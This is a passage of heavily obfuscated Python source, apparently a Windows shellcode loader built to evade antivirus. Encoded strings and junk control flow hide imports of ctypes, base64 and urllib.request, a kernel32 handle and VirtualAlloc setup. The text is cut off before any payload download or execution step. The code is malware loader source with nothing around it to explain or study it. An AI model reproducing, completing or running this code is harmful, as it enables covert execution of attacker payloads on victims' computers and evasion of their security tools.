__6433801026673 = 0
__6433801026673 += 1
try:
    raise MemoryError(__6433801026673)
except MemoryError as __4367115902850:
    if __4367115902850.args[0] == 1:
        globals()['R_E_D__A_V_______'] = bool if bool(bool(bool(bool))) < bool(type(int(118) > int(1016) < int(1411) > int(31))) and bool(str(str(93) > int(1612) < int(25) > int(1812))) > 2 else bool
    if __4367115902850.args[0] == 3:
        __2705630784306 = 93733496447953
    if __4367115902850.args[0] == 4:
        __5117408160882 = 85025453363494
    if __4367115902850.args[0] == 5:
        __6940033877878 = 211224939384819
    if __4367115902850.args[0] == 6:
        __6085145408814 = 59388825457344
__4934287569397 = 0
__4934287569397 += 1
try:
    raise MemoryError(__4934287569397)
except MemoryError as __8065943956189:
    if __8065943956189.args[0] == 1:
        globals()['R_E_D__A_V______'] = str if bool(bool(bool(str))) < bool(type(int(106) > int(12) < int(174) > int(186))) and bool(str(str(119) > int(179) < int(1413) > int(1611))) > 2 else str
    if __8065943956189.args[0] == 3:
        __3068077896196 = 33161200615714
    if __8065943956189.args[0] == 4:
        __2241387253832 = 46848819474666
__2324558214407 = 0
__2324558214407 += 1
try:
    raise MemoryError(__2324558214407)
except MemoryError as __8313874910382:
    if __8313874910382.args[0] == 1:
        globals()['R_E_D__A_V________'] = type if bool(bool(bool(type))) < bool(type(int(1618) > int(117) < int(410) > int(115))) and bool(str(str(1511) > int(1611) < int(98) > int(210))) > 2 else type
    if __8313874910382.args[0] == 3:
        __8394416237012 = 254410261011501
    if __8313874910382.args[0] == 4:
        __6858461755739 = 174716293737495
    if __8313874910382.args[0] == 5:
        __3658576843559 = 278021707734016
    if __8313874910382.args[0] == 6:
        __8220786322326 = 120018103472144
    if __8313874910382.args[0] == 7:
        __8262480947173 = 35712915704269
__3533463347967 = 0
__3533463347967 += 1
try:
    raise MemoryError(__3533463347967)
except MemoryError as __2973089314242:
    if __2973089314242.args[0] == 1:
        globals()['R_E_D__A_V_____'] = int if bool(bool(bool(int))) < bool(type(int(13) > int(210) < int(102) > int(1012))) and bool(str(str(63) > int(113) < int(1312) > int(121))) > 2 else int
    if __2973089314242.args[0] == 3:
        __3347175524730 = 276752813000802
    if __2973089314242.args[0] == 4:
        __6018381768200 = 207062077814390
    if __2973089314242.args[0] == 5:
        __8198720721434 = 279300127532663
    if __2973089314242.args[0] == 6:
        __3956469521235 = 145524464391427
__7027042887990 = 0
__7027042887990 += 1
try:
    raise MemoryError(__7027042887990)
except MemoryError as __6131915297477:
    if __6131915297477.args[0] == 1:
        globals()['R_E_D__A_V_________'] = bytes if bool(bool(bool(bytes))) < bool(type(int(711) > int(710) < int(1017) > int(1315))) and bool(str(str(1610) > int(49) < int(94) > int(1917))) > 2 else bytes
    if __6131915297477.args[0] == 3:
        __7164228714417 = 167661517323659
    if __6131915297477.args[0] == 4:
        __5424008974800 = 178605419230161
    if __6131915297477.args[0] == 5:
        __6653490813962 = 100579618580099
    if __6131915297477.args[0] == 6:
        __4735732766049 = 14438631544338
__8371531452222 = 0
__8371531452222 += 1
try:
    raise MemoryError(__8371531452222)
except MemoryError as __2445320381820:
    if __2445320381820.args[0] == 1:
        globals()['R_E_D__A_V__________'] = vars if bool(bool(bool(vars))) < bool(type(int(1315) > int(155) < int(97) > int(1612))) and bool(str(str(101) > int(23) < int(1619) > int(124))) > 2 else vars
    if __2445320381820.args[0] == 3:
        __7102358424693 = 186611810022500
    if __2445320381820.args[0] == 4:
        __2238842796055 = 228574038406250
    if __2445320381820.args[0] == 5:
        __5608302420727 = 154271633931586
    if __2445320381820.args[0] == 6:
        __3106550907609 = 170493094104857
    if __2445320381820.args[0] == 7:
        __4513299215105 = 253546980415293
__7927645899937 = 0
__7927645899937 += 1
try:
    raise MemoryError(__7927645899937)
except MemoryError as __7242887489585:
    if __7242887489585.args[0] == 1:
        globals()['R_E_D__A_V____________'] = callable if bool(bool(bool(callable))) < bool(type(int(119) > int(1918) < int(36) > int(111))) and bool(str(str(65) > int(918) < int(147) > int(1718))) > 2 else callable
    if __7242887489585.args[0] == 3:
        __2170223390926 = 229850103971190
__2541485112721 = 0
__2541485112721 += 1
try:
    raise MemoryError(__2541485112721)
except MemoryError as __8131228924944:
    if __8131228924944.args[0] == 1:
        globals()['R_E_D__A_V____'] = eval if bool(bool(bool(eval))) < bool(type(int(89) > int(516) < int(81) > int(615))) and bool(str(str(810) > int(58) < int(143) > int(125))) > 2 else eval
    if __8131228924944.args[0] == 3:
        __7359996718693 = 101253735552317
    if __8131228924944.args[0] == 4:
        __2218732458239 = 173990372546321
    if __8131228924944.args[0] == 5:
        __6962404079723 = 140001517998381
    if __8131228924944.args[0] == 6:
        __7275709920345 = 65411057829791
    if __8131228924944.args[0] == 7:
        __6883467170521 = 244616453600925
__4882187863934 = 0
__4882187863934 += 1
try:
    raise MemoryError(__4882187863934)
except MemoryError as __3341470729802:
    if __3341470729802.args[0] == 1:
        globals()['______________R_E_D__A_V______________'] = list if bool(bool(bool(list))) < bool(type(int(411) > int(119) < int(158) > int(515))) and bool(str(str(73) > int(172) < int(515) > int(177))) > 2 else list
    if __3341470729802.args[0] == 3:
        __8106577264119 = 274737223671874
    if __3341470729802.args[0] == 4:
        __5038251605628 = 98550085373732
    if __3341470729802.args[0] == 5:
        __8112878972078 = 123511006180983
__8436371738999 = 0
__8436371738999 += 1
try:
    raise MemoryError(__8436371738999)
except MemoryError as __7962270927185:
    if __7962270927185.args[0] == 1:
        globals()['R_E_D__A_V______________'] = map if bool(bool(bool(map))) < bool(type(int(710) > int(195) < int(185) > int(149))) and bool(str(str(56) > int(1517) < int(1217) > int(1815))) > 2 else map
    if __7962270927185.args[0] == 3:
        __5853013000565 = 139667975148314
__5217331198681 = 0
__5217331198681 += 1
try:
    raise MemoryError(__5217331198681)
except MemoryError as __6962765726152:
    if __6962765726152.args[0] == 1:
        globals()['R_E_D__A_V___'] = __import__ if bool(bool(bool(__import__))) < bool(type(int(81) > int(83) < int(914) > int(1611))) and bool(str(str(177) > int(319) < int(135) > int(1116))) > 2 else __import__
    if __6962765726152.args[0] == 3:
        __7484651921997 = 106181379750551
    if __6962765726152.args[0] == 4:
        __7452999228403 = 159220157077279
    if __6962765726152.args[0] == 5:
        __5133258807222 = 161931299529292
    if __6962765726152.args[0] == 6:
        __3050104318372 = 275530386560367
    if __6962765726152.args[0] == 7:
        __4062236234967 = 23079550100091
__3356983655830 = 0
__3356983655830 += 1
try:
    raise MemoryError(__3356983655830)
except MemoryError as __8606456397078:
    if __8606456397078.args[0] == 1:
        globals()['tryᅠ'] = print if bool(bool(bool(print))) < bool(type(int(166) > int(25) < int(185) > int(1219))) and bool(str(str(712) > int(1514) < int(107) > int(312))) > 2 else print
    if __8606456397078.args[0] == 3:
        __6647842255074 = 934524299865
__8611724468517 = 0
__8611724468517 += 1
try:
    raise MemoryError(__8611724468517)
except MemoryError as __5024426812410:
    if __5024426812410.args[0] == 1:
        globals()['exceptᅠ'] = input if bool(bool(bool(input))) < bool(type(int(1018) > int(53) < int(135) > int(517))) and bool(str(str(71) > int(717) < int(919) > int(139))) > 2 else input
    if __5024426812410.args[0] == 3:
        __7544159274684 = 137972889385022
    if __5024426812410.args[0] == 4:
        __3841037682033 = 199097220423811

def R_E_D__A_V____(RED_DEFENDER, *k):
    __2994286310666 = 0
    __2994286310666 += 1
    try:
        raise MemoryError(__2994286310666)
    except MemoryError as __6400241527978:
        if __6400241527978.args[0] == 1:
            if k:
                R_E_D____A_V = '+'
                op = '+'
            else:
                R_E_D____A_V = ''
                op = ''
        if __6400241527978.args[0] == 1:
            globals()['_182'] = (lambda: (lambda _613: _613 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __6400241527978.args[0] == 1:
            globals()['R_E_D__A_V____'] = R_E_D__A_V____
        if __6400241527978.args[0] == 1:
            globals()['R_E_D__A_V______'] = R_E_D__A_V______
        if __6400241527978.args[0] == 1:
            globals()['RED_DEFENDER'] = RED_DEFENDER
        if __6400241527978.args[0] == 1:
            for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
                if not _182:
                    globals()['R_E_D____A_V_'] += (lambda: '')()
                R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_)
                f = (lambda: (lambda _196: _196 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __6400241527978.args[0] == 1:
            return R_E_D____A_V
        if __6400241527978.args[0] == 9:
            __8206392802445 = 154587859863121
        if __6400241527978.args[0] == 10:
            __5323450295520 = 151580979239323

def ______R_E_D__A_V_______(x):
    __2280986889181 = 0
    __2280986889181 += 1
    try:
        raise MemoryError(__2280986889181)
    except MemoryError as __5239856574536:
        if __5239856574536.args[0] == 1:
            return R_E_D__A_V_____(x - 30583)
        if __5239856574536.args[0] == 3:
            __3420909417554 = 171117830136137
        if __5239856574536.args[0] == 4:
            __6698242988573 = 96721822513140
        if __5239856574536.args[0] == 5:
            __2496507223296 = 84669852841678
        if __5239856574536.args[0] == 6:
            __3263074127486 = 97782432574897

def R_E_D__A_V(e):
    __7761179288772 = 0
    __7761179288772 += 1
    try:
        raise MemoryError(__7761179288772)
    except MemoryError as __5123585742423:
        if __5123585742423.args[0] == 1:
            br = bytearray(e[len(b'R_E_D__A_V__'):])
        if __5123585742423.args[0] == 1:
            r = 0
        if __5123585742423.args[0] == 1:
            for b in br:
                r = r * 256 + b
        if __5123585742423.args[0] == 1:
            return r
        if __5123585742423.args[0] == 6:
            __2176612323853 = 168210196787436
        if __5123585742423.args[0] == 7:
            __8446597298821 = 191414158769272
        if __5123585742423.args[0] == 8:
            __3034422290064 = 213319648913857
        if __5123585742423.args[0] == 9:
            __4741759660688 = 116495725036843

def ____________________________(x):
    __8015524003619 = 0
    __8015524003619 += 1
    try:
        raise MemoryError(__8015524003619)
    except MemoryError as __2786092483747:
        if __2786092483747.args[0] == 1:
            ar = []
        if __2786092483747.args[0] == 1:
            for i in x:
                ar.append(R_E_D__A_V____(i))
        if __2786092483747.args[0] == 1:
            return ar
        if __2786092483747.args[0] == 5:
            __3118815328169 = 27920619321486
        if __2786092483747.args[0] == 6:
            __7470811011968 = 149636352234511
if (lambda: (lambda _194: _194 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)():

    def R_E_D__A_V_______________(R_E_D__A_V____________):
        R_E_D__A_V____________ = R_E_D__A_V____________ - 16742655
        if R_E_D__A_V____________ <= 127:
            return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]), 'utf8')
        elif R_E_D__A_V____________ <= 2047:
            if 1 < 2:
                b1 = 192 | R_E_D__A_V____________ >> 6
            b2 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]), 'utf8')
        elif R_E_D__A_V____________ <= 65535:
            b1 = 224 | R_E_D__A_V____________ >> 12
            if 2 > 1:
                b2 = 128 | R_E_D__A_V____________ >> 6 & 63
            b3 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]), 'utf8')
        else:
            b1 = 240 | R_E_D__A_V____________ >> 18
            if 2 == 2:
                b2 = 128 | R_E_D__A_V____________ >> 12 & 63
            if 1 < 2 < 3:
                b3 = 128 | R_E_D__A_V____________ >> 6 & 63
            b4 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]), 'utf8')

    def _hex(j):
        R_E_D__A_V____________ = ''
        for _hex in j:
            R_E_D__A_V____________ += R_E_D__A_V_______________(_hex)
        return R_E_D__A_V____________
else:
    'R_E_D____A_V'
try:
    match '124' == '1511':
        case True:
            raise MemoryError([True])
        case False:
            _915 = [[True], [False]]
            R_E_D__A_V______(['_1319'])
    raise MemoryError([True])
except MemoryError as _1218:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _135: _135 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _136 = [[(lambda: (lambda _185: _185 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1310: _1310 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _712: _712 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _192:
        import sys
try:
    match '118' == '174':
        case True:
            raise MemoryError([True])
        case False:
            _1513 = [[True], [False]]
            R_E_D__A_V______(['_111'])
    raise MemoryError([True])
except MemoryError as _1310:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742703]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _614: _614 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _318 = [[(lambda: (lambda _414: _414 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _817: _817 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _1413: _1413 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _176:
        import ctypes
try:
    match '135' == '26':
        case True:
            raise MemoryError([True])
        case False:
            _1319 = [[True], [False]]
            R_E_D__A_V______(['_142'])
    raise MemoryError([True])
except MemoryError as _131:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _179: _179 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _414 = [[(lambda: (lambda _42: _42 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1219: _1219 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _1316: _1316 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1715:
        import base64
try:
    match '919' == '113':
        case True:
            raise MemoryError([True])
        case False:
            _179 = [[True], [False]]
            R_E_D__A_V______(['_510'])
    raise MemoryError([True])
except MemoryError as _57:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1017: _1017 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _107 = [[(lambda: (lambda _1011: _1011 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _23: _23 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda: (lambda _1218: _1218 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _147:
        import ctypes.wintypes as wt
try:
    match '916' == '717':
        case True:
            raise MemoryError([True])
        case False:
            _177 = [[True], [False]]
            R_E_D__A_V______(['_1612'])
    raise MemoryError([True])
except MemoryError as _911:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _111: _111 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1510 = [[(lambda: (lambda _49: _49 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _115: _115 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda: (lambda _511: _511 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _193:
        import urllib.request
try:
    match '514' == '1713':
        case True:
            raise MemoryError([True])
        case False:
            _910 = [[True], [False]]
            R_E_D__A_V______(['_49'])
    raise MemoryError([True])
except MemoryError as _1013:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _813: _813 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _46 = [[(lambda: (lambda _314: _314 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _64: _64 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda: (lambda _87: _87 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _194:
        __3717646528745 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1216' == '119':
        case True:
            raise MemoryError([True])
        case False:
            _417 = [[True], [False]]
            R_E_D__A_V______(['_187'])
    raise MemoryError([True])
except MemoryError as _1311:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1815: _1815 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _69 = [[(lambda: (lambda _1413: _1413 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _129: _129 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _817: _817 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _179:
        __3717646528745 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '86' == '68':
        case True:
            raise MemoryError([True])
        case False:
            _1911 = [[True], [False]]
            R_E_D__A_V______(['_148'])
    raise MemoryError([True])
except MemoryError as _918:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1916: _1916 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _417 = [[(lambda: (lambda _124: _124 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _42: _42 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _97: _97 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _134:
        try:
            raise MemoryError(__3717646528745)
        except MemoryError as __6181006654541:
            if __6181006654541.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32 = ctypes.windll.kernel32
            if __6181006654541.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7646109004344 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xbax]?G\x82'))()
            if __6181006654541.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2192074454748 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x16n\x99\xca\x1cJ'))()
            if __6181006654541.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __2735726839240 = (lambda: R_E_D__A_V(b'R_E_D__A_V__|H|\xbd\x0eu'))()
            if __6181006654541.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __7538617675636 = (lambda: R_E_D__A_V(b'R_E_D__A_V__b\xd0\x86K\x0b\xdc'))()
try:
    match '92' == '1914':
        case True:
            raise MemoryError([True])
        case False:
            _215 = [[True], [False]]
            R_E_D__A_V______(['_104'])
    raise MemoryError([True])
except MemoryError as _1319:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _121: _121 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _317 = [[(lambda: (lambda _1317: _1317 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _81: _81 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _110: _110 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _711:
        __5870930547009 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '516' == '132':
        case True:
            raise MemoryError([True])
        case False:
            _212 = [[True], [False]]
            R_E_D__A_V______(['_110'])
    raise MemoryError([True])
except MemoryError as _1213:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _413: _413 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1619 = [[(lambda: (lambda _48: _48 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1019: _1019 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda: (lambda _316: _316 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _912:
        __5870930547009 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1415' == '147':
        case True:
            raise MemoryError([True])
        case False:
            _23 = [[True], [False]]
            R_E_D__A_V______(['_129'])
    raise MemoryError([True])
except MemoryError as _85:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742703]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1816: _1816 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _715 = [[(lambda: (lambda _172: _172 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1510: _1510 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _197: _197 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _310:
        try:
            raise MemoryError(__5870930547009)
        except MemoryError as __7917407193789:
            if __7917407193789.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
            if __7917407193789.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5264147433394 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xba\xe5E\xd1\xea\xa2'))()
            if __7917407193789.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __5480242260468 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xe3\xc9\xbc%A\x8d'))()
            if __7917407193789.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __2309235249123 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x92\xe9\x18;\x94s'))()
try:
    match '1019' == '1417':
        case True:
            raise MemoryError([True])
        case False:
            _1019 = [[True], [False]]
            R_E_D__A_V______(['_104'])
    raise MemoryError([True])
except MemoryError as _1815:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _198: _198 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1912 = [[(lambda: (lambda _86: _86 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1713: _1713 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742707]))))())())()])
        raise MemoryError([(lambda: (lambda _1419: _1419 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _319:
        __5148465748935 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1811' == '53':
        case True:
            raise MemoryError([True])
        case False:
            _515 = [[True], [False]]
            R_E_D__A_V______(['_615'])
    raise MemoryError([True])
except MemoryError as _1110:
    try:
